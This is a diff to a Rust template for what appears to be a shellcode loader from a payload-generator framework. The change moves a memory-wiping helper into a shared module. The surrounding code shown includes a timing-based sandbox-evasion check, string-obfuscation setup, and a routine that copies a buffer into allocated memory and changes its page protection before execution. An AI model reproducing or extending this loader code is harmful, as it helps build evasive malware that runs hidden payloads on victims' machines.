@@ -2,6 +2,7 @@
 #![allow(non_snake_case)]
 
 {{LITCRYPT_SETUP}}
+{{COMMON_MODULE}}
 
 use std::ptr::{null, null_mut};
 
@@ -30,12 +31,6 @@ fn check_environment() -> bool {
     start.elapsed().as_millis() >= 2500
 }
 
-fn wipe(buf: &mut Vec<u8>) {
-    for b in buf.iter_mut() {
-        unsafe { std::ptr::write_volatile(b as *mut u8, 0); }
-    }
-    buf.clear();
-}
 
 fn enhance(mut buf: Vec<u8>) {
     unsafe {
@@ -48,7 +43,7 @@ fn enhance(mut buf: Vec<u8>) {
         let alloc_ptr: *mut u8 = alloc as *mut u8;
         std::ptr::copy_nonoverlapping(buf.as_ptr(), alloc_ptr, buf_len);
 
-        wipe(&mut buf);
+        common::wipe(&mut buf);
         pause(200);
 
         let mut old_perms: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;
